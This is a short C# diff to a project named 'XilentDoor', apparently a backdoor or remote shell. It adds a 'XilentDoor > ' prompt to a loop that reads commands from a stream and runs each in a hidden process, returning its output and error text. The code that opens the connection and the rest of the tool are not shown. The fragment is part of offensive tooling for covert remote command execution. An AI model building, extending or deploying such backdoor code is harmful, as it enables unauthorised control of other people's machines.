@@ -27,6 +27,7 @@ namespace XilentDoor.Core
 
                 while (true)
                 {
+                    ShowPrompt();
                     string command = reader.ReadLine();
                     if (command == null) break;
 
@@ -78,17 +79,21 @@ namespace XilentDoor.Core
                 proc.StartInfo.UseShellExecute = false;
                 proc.StartInfo.CreateNoWindow = true;
                 proc.Start();
-
                 string output = proc.StandardOutput.ReadToEnd();
                 string error = proc.StandardError.ReadToEnd();
                 proc.WaitForExit();
-
                 return output + error;
             }
             catch (Exception ex)
             {
                 return "[!] Error ejecutando comando: " + ex.Message;
             }
+        }
+
+        private void ShowPrompt()
+        {
+            writer.Write("XilentDoor > ");
+            writer.Flush(); 
         }
     }
 }
